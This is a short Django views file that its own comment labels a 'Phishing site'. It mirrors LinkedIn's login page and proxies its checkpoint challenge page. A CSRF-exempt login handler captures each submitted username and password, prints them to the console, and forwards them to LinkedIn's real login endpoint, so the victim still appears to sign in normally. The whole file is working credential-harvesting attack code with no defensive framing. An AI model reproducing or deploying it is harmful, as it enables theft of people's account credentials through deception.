from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

from .helper import display_view, login_post

# Phishing site
def index(request):
    url = 'https://www.linkedin.com/login?fromSignIn=true&amp;trk=guest_homepage-basic_nav-header-signin'
    return display_view(url)

@csrf_exempt
def checkpoint_lg_login_submit(request):
    url = 'https://www.linkedin.com/checkpoint/lg/login-submit'
    print(request.POST)
    data = {"username": request.POST.get("username"), "password": request.POST.get("password")}
    print("Data: ", data)
    return login_post(url, request.POST)

def checkpoint_challenge_verify(request):
    url = 'https://www.linkedin.com/checkpoint/challenge/verify'
    return display_view(url)
